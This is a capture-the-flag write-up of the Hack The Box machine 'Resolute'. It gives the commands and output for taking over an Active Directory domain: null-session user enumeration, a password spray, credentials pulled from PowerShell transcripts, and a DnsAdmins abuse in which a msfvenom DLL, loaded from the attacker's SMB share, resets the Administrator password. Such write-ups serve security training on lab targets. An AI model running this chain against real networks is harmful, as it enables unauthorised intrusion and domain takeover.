---
title: HTB - Resolute
date: 2024-03-18
categories: [CTF, Fullpwn]
tags: [htb, hackthebox, resolute, nmap, netexec, nxc, smb, null-session, password-spray, dnscmd, dns-admins, msfvenom, psexec, active-directory, windows, sharphound, bloodhound, winrm, evil-winrm]
img_path: /assets/htb/fullpwn/sauna
published: true
image:
    path: machine_info.png
---

## HTB: Resolute

>[Resolute Box](https://app.hackthebox.com/machines/220)

![](resolute_diagram.png){: .normal}

## Walkthrough Summary

|Step|Action|Tool|Achieved|
|-|-|-|-|
|1|Enumerated SMB server|[NetExec](https://github.com/Pennyw0rth/NetExec)|Obtained usernames and inactive credentials|
|2|Password Spray|[NetExec](https://github.com/Pennyw0rth/NetExec)|Obtained active user credentials (foothold)|
|3|System Enumeration|[LOTL*](https://encyclopedia.kaspersky.com/glossary/lotl-living-off-the-land/)|Obtained active user credentials (lateral movement)|
|4|Exploited Group Membership|[dnscmd](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/dnscmd), [msfvenom](https://www.rapid7.com/blog/post/2011/05/24/introducing-msfvenom/)|Changed _Administrator_'s password (privilege escalation)|
|5|Logged into the DC as _Administrator_|[psexec](https://github.com/fortra/impacket/blob/master/examples/psexec.py)|Compromised domain|

*_Living Off The Land_

## Attack Chain Reproduction Steps

TCP all-ports scan:

```bash
$ sudo nmap 10.10.10.169 -T4 -A -open -p-

PORT      STATE SERVICE      VERSION
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2024-03-18 15:13:17Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf       .NET Message Framing
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49671/tcp open  msrpc        Microsoft Windows RPC
49678/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49679/tcp open  msrpc        Microsoft Windows RPC
49684/tcp open  msrpc        Microsoft Windows RPC
49708/tcp open  msrpc        Microsoft Windows RPC

Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
|_clock-skew: mean: 2h26m55s, deviation: 4h02m32s, median: 6m53s
| smb-os-discovery:
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Resolute
|   NetBIOS computer name: RESOLUTE\x00
|   Domain name: megabank.local
|   Forest name: megabank.local
|   FQDN: Resolute.megabank.local
|_  System time: 2024-03-18T08:14:21-07:00
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2024-03-18T15:14:19
|_  start_date: 2024-03-18T15:11:25
```

Enumerate SMB via NULL session:

```bash
# enumerate domain users via SMB NULL session
$ nxc smb 10.10.10.169 -u '' -p '' --users --log nxc_users.lst
SMB         10.10.10.169    445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
SMB         10.10.10.169    445    RESOLUTE         [+] megabank.local\:
SMB         10.10.10.169    445    RESOLUTE         [*] Trying to dump local users with SAMRPC protocol
SMB         10.10.10.169    445    RESOLUTE         [+] Enumerated domain user(s)
SMB         10.10.10.169    445    RESOLUTE         megabank.local\Administrator                  Built-in account for administering the computer/domain
SMB         10.10.10.169    445    RESOLUTE         megabank.local\Guest                          Built-in account for guest access to the computer/domain
SMB         10.10.10.169    445    RESOLUTE         megabank.local\krbtgt                         Key Distribution Center Service Account
SMB         10.10.10.169    445    RESOLUTE         megabank.local\DefaultAccount                 A user account managed by the system.
SMB         10.10.10.169    445    RESOLUTE         megabank.local\ryan
SMB         10.10.10.169    445    RESOLUTE         megabank.local\marko                          Account created. Password set to W<REDACTED>!
SMB         10.10.10.169    445    RESOLUTE         megabank.local\sunita
SMB         10.10.10.169    445    RESOLUTE         megabank.local\abigail
SMB         10.10.10.169    445    RESOLUTE         megabank.local\marcus
SMB         10.10.10.169    445    RESOLUTE         megabank.local\sally
SMB         10.10.10.169    445    RESOLUTE         megabank.local\fred
SMB         10.10.10.169    445    RESOLUTE         megabank.local\angela
SMB         10.10.10.169    445    RESOLUTE         megabank.local\felicia
SMB         10.10.10.169    445    RESOLUTE         megabank.local\gustavo
SMB         10.10.10.169    445    RESOLUTE         megabank.local\ulf
SMB         10.10.10.169    445    RESOLUTE         megabank.local\stevie
SMB         10.10.10.169    445    RESOLUTE         megabank.local\claire
SMB         10.10.10.169    445    RESOLUTE         megabank.local\paulo
SMB         10.10.10.169    445    RESOLUTE         megabank.local\steve
SMB         10.10.10.169    445    RESOLUTE         megabank.local\annette
SMB         10.10.10.169    445    RESOLUTE         megabank.local\annika
SMB         10.10.10.169    445    RESOLUTE         megabank.local\per
SMB         10.10.10.169    445    RESOLUTE         megabank.local\claude
SMB         10.10.10.169    445    RESOLUTE         megabank.local\melanie
SMB         10.10.10.169    445    RESOLUTE         megabank.local\zach
SMB         10.10.10.169    445    RESOLUTE         megabank.local\simon
SMB         10.10.10.169    445    RESOLUTE         megabank.local\naoki

# create a user list
$ cat nxc_users.lst | cut -d"\\" -f2 | cut -d" " -f1 > domain_users.txt
```

Confirm found credentials:

```bash
$ nxc smb 10.10.10.169 -u 'marko' -p 'W<REDACTED>!'
SMB         10.10.10.169    445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\marko:W<REDACTED>! STATUS_LOGON_FAILURE
```

It seems like the credentials obtained were the default ones and have now been changed. We can use them for a **password spray**:

```bash
# getting the password policy
$ nxc smb 10.10.10.169 -u '' -p '' --pass-pol
SMB         10.10.10.169    445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
SMB         10.10.10.169    445    RESOLUTE         [+] megabank.local\:
SMB         10.10.10.169    445    RESOLUTE         [+] Dumping password info for domain: MEGABANK
SMB         10.10.10.169    445    RESOLUTE         Minimum password length: 7
SMB         10.10.10.169    445    RESOLUTE         Password history length: 24
SMB         10.10.10.169    445    RESOLUTE         Maximum password age: Not Set
SMB         10.10.10.169    445    RESOLUTE
SMB         10.10.10.169    445    RESOLUTE         Password Complexity Flags: 000000
SMB         10.10.10.169    445    RESOLUTE             Domain Refuse Password Change: 0
SMB         10.10.10.169    445    RESOLUTE             Domain Password Store Cleartext: 0
SMB         10.10.10.169    445    RESOLUTE             Domain Password Lockout Admins: 0
SMB         10.10.10.169    445    RESOLUTE             Domain Password No Clear Change: 0
SMB         10.10.10.169    445    RESOLUTE             Domain Password No Anon Change: 0
SMB         10.10.10.169    445    RESOLUTE             Domain Password Complex: 0
SMB         10.10.10.169    445    RESOLUTE
SMB         10.10.10.169    445    RESOLUTE         Minimum password age: 1 day 4 minutes
SMB         10.10.10.169    445    RESOLUTE         Reset Account Lockout Counter: 30 minutes
SMB         10.10.10.169    445    RESOLUTE         Locked Account Duration: 30 minutes
SMB         10.10.10.169    445    RESOLUTE         Account Lockout Threshold: None
SMB         10.10.10.169    445    RESOLUTE         Forced Log off Time: Not Set

# performing a password spray
$ nxc smb 10.10.10.169 -u domain_users.txt -p 'W<REDACTED>!' | grep +
SMB         10.10.10.169    445    RESOLUTE         [+] megabank.local\melanie:W<REDACTED>!
```

Check for WinRM access:

```bash
$ nxc winrm 10.10.10.169 -u 'melanie' -p 'W<REDACTED>!'
SMB         10.10.10.169    445    RESOLUTE         [*] Windows 10 / Server 2016 Build 14393 (name:RESOLUTE) (domain:megabank.local)
WINRM       10.10.10.169    5985   RESOLUTE         [+] megabank.local\melanie:W<REDACTED>! (Pwn3d!)
```

Obtain **initial foothold** and compromise the **_user.txt_** file:

```bash
$ evil-winrm -i 10.10.10.169 -u 'melanie' -p 'W<REDACTED>!'

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\melanie\Documents> type ..\desktop\user.txt
2cf<REDACTED>029
```

Collect and analyze domain information:

```bash
*Evil-WinRM* PS C:\Users\melanie\Documents> upload SharpHound.exe

Info: Uploading /home/kali/htb/resolute/SharpHound.exe to C:\Users\melanie\Documents\SharpHound.exe

Data: 965288 bytes of 965288 bytes copied

Info: Upload successful!

*Evil-WinRM* PS C:\Users\melanie\Documents> .\SharpHound.exe -c all
*Evil-WinRM* PS C:\Users\melanie\Documents> download 20240318090426_BloodHound.zip

Info: Downloading C:\Users\melanie\Documents\20240318090426_BloodHound.zip to 20240318090426_BloodHound.zip

Info: Download successful!
```

We need SYSTEM access to fully compromise the domain:

![](resolute_dcsync.png)

By performing system enumeration a hidden directory was found:

```bash
*Evil-WinRM* PS C:\> dir -force


    Directory: C:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
<SNIP>
d--h--        12/3/2019   6:32 AM                PSTranscripts
<SNIP

*Evil-WinRM* PS C:\PSTranscripts> dir -force


    Directory: C:\PSTranscripts


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d--h--        12/3/2019   6:45 AM                20191203

*Evil-WinRM* PS C:\PSTranscripts> cd 20191203
*Evil-WinRM* PS C:\PSTranscripts\20191203> dir -force


    Directory: C:\PSTranscripts\20191203


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-arh--        12/3/2019   6:45 AM           3732 PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt

*Evil-WinRM* PS C:\PSTranscripts\20191203> type PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt
<SNIP>
>> ParameterBinding(Invoke-Expression): name="Command"; value="cmd /c net use X: \\fs01\backups ryan Se<REDACTED>3!
<SNIP>
```

Confirm credentials:

```bash
$ nxc winrm 10.10.10.169 -u ryan -p Se<REDACTED>3!
SMB         10.10.10.169    445    RESOLUTE         [*] Windows 10 / Server 2016 Build 14393 (name:RESOLUTE) (domain:megabank.local)
WINRM       10.10.10.169    5985   RESOLUTE         [+] megabank.local\ryan:Se<REDACTED>3! (Pwn3d!)
```

Log in as ryan:

```bash
$ evil-winrm -i 10.10.10.169 -u 'ryan' -p 'Se<REDACTED>3!'

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\ryan\Documents> whoami
megabank\ryan
```

A file was found on his desktop:

```bash
*Evil-WinRM* PS C:\Users\ryan> type desktop\note.txt
Email to team:

- due to change freeze, any system changes (apart from those to the administrator account) will be automatically reverted within 1 minute
```

The user is a member of the **_DnsAdmins_** group which allows him to specify a plugin DLL that can be loaded upon starting the DNS service:

```bash
*Evil-WinRM* PS C:\Users\ryan> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                            Attributes
========================================== ================ ============================================== ===============================================================
Everyone                                   Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
MEGABANK\Contractors                       Group            S-1-5-21-1392959593-3013219662-3596683436-1103 Mandatory group, Enabled by default, Enabled group
MEGABANK\DnsAdmins                         Alias            S-1-5-21-1392959593-3013219662-3596683436-1101 Mandatory group, Enabled by default, Enabled group, Local Group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
```

![](resolute_ryan_dnsadmins.png)

We can take advantage of this by creating a payload that changes that **_Administrator_**'s password:

```bash
$ sudo msfvenom -p windows/x64/exec cmd='net user administrator P@s5w0rd123! /domain' - f dll > da.dll
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 311 bytes
```

Launch an SMB server on the attack host to serve the payload:

```bash
$ sudo /opt/impacket/examples/smbserver.py -smb2support share ./
Impacket v0.12.0.dev1+20231027.123703.c0e949fe - Copyright 2023 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

Set the remote DLL path into the Windows Registry on the target:

```bash
*Evil-WinRM* PS C:\Users\ryan> dnscmd.exe /config /serverlevelplugindll \\10.10.14.25\share\da.dll

Registry property serverlevelplugindll successfully reset.
Command completed successfully.
```

Restart DNS service:

```bash
*Evil-WinRM* PS C:\Users\ryan> sc.exe stop dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 3  STOP_PENDING
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x1
        WAIT_HINT          : 0x7530
*Evil-WinRM* PS C:\Users\ryan> sc.exe start dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 1924
        FLAGS              :
```

Confirm the connection to the SMB server:

```bash
$ sudo /opt/impacket/examples/smbserver.py -smb2support share ./
Impacket v0.12.0.dev1+20231027.123703.c0e949fe - Copyright 2023 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.10.169,50282)
[*] AUTHENTICATE_MESSAGE (MEGABANK\RESOLUTE$,RESOLUTE)
[*] User RESOLUTE\RESOLUTE$ authenticated successfully
[*] RESOLUTE$::MEGABANK:aaaaaaaaaaaaaaaa:85653f0136e179a68948a47c15c1b882:0101000000000000000456845d79da0159f5ac051abe9d80000000000100100049007a0063007000470057004b0065000300100049007a0063007000470057004b00650002001000440076004400410075006a0069004d0004001000440076004400410075006a0069004d0007000800000456845d79da0106000400020000000800300030000000000000000000000000400000b9643995525e3ddfc8fec193ac82610145ec78b328ded3e7412306348c1dbad70a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00320035000000000000000000
[*] Connecting Share(1:IPC$)
[*] Connecting Share(2:share)
[*] Disconnecting Share(1:IPC$)
[*] Disconnecting Share(2:share)
[*] Closing down connection (10.10.10.169,50282)
[*] Remaining connections []
```

Connect to the target as **_Administrator_** and compromise the **_root.txt_** file:

```bash
$ psexec megabank.local/administrator@10.10.10.169
Impacket v0.12.0.dev1+20231027.123703.c0e949fe - Copyright 2023 Fortra

Password:
[*] Requesting shares on 10.10.10.169.....
[*] Found writable share ADMIN$
[*] Uploading file vElqkYYM.exe
[*] Opening SVCManager on 10.10.10.169.....
[*] Creating service pcgo on 10.10.10.169.....
[*] Starting service pcgo.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32> type c:\users\administrator\desktop\root.txt
4c3<REDACTED>0aff
```